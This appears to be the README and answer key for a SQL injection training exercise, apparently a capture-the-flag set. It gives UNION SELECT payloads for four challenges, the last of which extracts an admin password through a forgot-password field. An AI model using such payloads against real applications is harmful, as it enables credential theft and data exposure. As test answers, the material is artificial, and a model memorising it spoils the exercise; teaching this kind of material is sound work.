# Introduction

The goal of this problem set is to expose participants to (SQL injection vulnerabilities)[https://owasp.org/www-community/attacks/SQL_Injection].

SQL injections can occur in online web applications that do not perform sanitization on user inputs. That means, when you create a form in a web application (such as a username and password login), you should be mindful on how the operations you perform with the user's input are used in the rest of your code.

Each challenge below, has a slightly different vulnerability.

## Challenge 1 (IT Department)

```
' UNION SELECT flag FROM flags --
```

## Challenge 2 (Root Crdentials DB)
```
1 UNION SELECT flag, NULL, NULL FROM hidden_flags --
```

## Challenge 3 (Logs Endpoint)

```
' UNION SELECT secret_code, NULL FROM library_secrets --
```

## Challenge 4 

Click on the "forgot password" field.

Then use the following to output the password:

```
x' UNION SELECT password FROM users WHERE username='admin' --
```

